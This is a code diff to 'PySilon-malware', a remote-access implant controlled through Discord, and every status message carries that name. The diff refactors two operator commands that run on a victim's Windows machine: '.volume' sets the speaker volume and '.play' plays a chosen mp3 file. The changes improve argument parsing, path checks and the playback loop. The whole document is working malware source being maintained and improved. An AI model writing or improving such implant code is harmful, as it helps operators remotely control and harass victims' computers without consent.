@@ -3,56 +3,61 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pygame
 import threading
-# end of imports
+import os
 
-# on message
-elif message.content[:7] == '.volume':
-    #.log Message is "volume"
+elif message.content.startswith('.volume'):
     await message.delete()
-    #.log Removed the message 
-    if message.content.strip() == '.volume':
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
+    args = message.content.split()
+    
+    if len(args) < 2 or not args[1].isdigit():
+        embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')
     else:
-        volume_int = message.content[8:]
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        volume_int = int(volume_int)
-        volume_int = volume_int / 100
-        if volume_int <= 1 and volume_int >= 0:
-            volume.SetMasterVolumeLevelScalar(volume_int, None)
-            embed = discord.Embed(title="🟢 Success",description=f'```Successfully set volume to {volume_int * 100}%```', colour=discord.Colour.green())
+        volume_int = int(args[1])
+        if 0 <= volume_int <= 100:
+            devices = AudioUtilities.GetSpeakers()
+            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+            volume = cast(interface, POINTER(IAudioEndpointVolume))
+            volume.SetMasterVolumeLevelScalar(volume_int / 100.0, None)
+            
+            embed = discord.Embed(title="🟢 Success", description=f'```Successfully set volume to {volume_int}%```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+            reaction_msg = await message.channel.send(embed=embed)
+            await reaction_msg.add_reaction('🔴')
         else:
-            embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error", description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+            reaction_msg = await message.channel.send(embed=embed)
+            await reaction_msg.add_reaction('🔴')
 
-elif message.content[:5] == '.play':
+elif message.content.startswith('.play'):
     await message.delete()
-    #.log Removed the message 
-    if message.content.strip() == '.play':
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
+    audio_file = message.content[5:].strip().strip('"').strip("'")
+    
+    if not audio_file:
+        embed = discord.Embed(title="📛 Error", description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-    elif not message.content.endswith('.mp3'):
-        embed = discord.Embed(title="📛 Error",description='```Not a valid file type.```', colour=discord.Colour.red())
+        reaction_msg = await message.channel.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')
+    elif not audio_file.lower().endswith('.mp3') or not os.path.isfile(audio_file):
+        embed = discord.Embed(title="📛 Error", description='```Not a valid file or path does not exist.```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')
     else:
-        def play_audio():
-            audio_file = message.content[6:]
-            audio_file = audio_file.replace('\\','/')
+        def play_audio(path):
             pygame.mixer.init()
-            pygame.mixer.music.load(audio_file)
+            pygame.mixer.music.load(path)
             pygame.mixer.music.play()
-
+            clock = pygame.time.Clock()
             while pygame.mixer.music.get_busy():
-                pass
-
+                clock.tick(10)
             pygame.mixer.quit()
 
-        threading.Thread(target=play_audio).start()
+        threading.Thread(target=play_audio, args=(audio_file,), daemon=True).start()
+        embed = discord.Embed(title="🟢 Playing", description=f'```Playing: {os.path.basename(audio_file)}```', colour=discord.Colour.green())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        reaction_msg = await message.channel.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')
